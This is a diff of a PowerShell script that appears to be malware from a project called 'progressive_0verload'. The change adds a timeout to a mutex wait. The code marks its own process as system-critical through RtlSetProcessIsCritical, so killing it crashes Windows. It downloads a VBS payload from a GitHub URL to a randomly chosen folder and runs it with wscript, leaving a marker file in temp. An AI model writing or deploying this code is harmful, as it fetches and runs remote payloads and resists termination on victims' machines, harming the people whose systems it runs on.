@@ -26,19 +26,20 @@ Add-Type -TypeDefinition $signature
 [CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
 
 if([string]::IsNullOrEmpty($basePath)){
-    $mutex.WaitOne()
-    try {
-        if(-not(Test-Path -Path "$env:temp\598600304.txt" -PathType Leaf)){
-            $pa = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
-            $pa = "$pa\async_fun.vbs"
-            iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/warning.vbs" -OutFile "$pa"
-            wscript.exe $pa
-            New-Item -Path "$env:temp\598600304.txt" -ItemType File -Force
+    if($mutex.WaitOne(5000)){
+        try {
+            if(-not(Test-Path -Path "$env:temp\598600304.txt" -PathType Leaf)){
+                $pa = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+                $pa = "$pa\async_fun.vbs"
+                iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/warning.vbs" -OutFile "$pa"
+                wscript.exe $pa
+                New-Item -Path "$env:temp\598600304.txt" -ItemType File -Force
+            }
         }
-    }
-    finally {
-        $mutex.ReleaseMutex()
-        exit
+        finally {
+            $mutex.ReleaseMutex()
+            exit
+        }
     }
 }
 
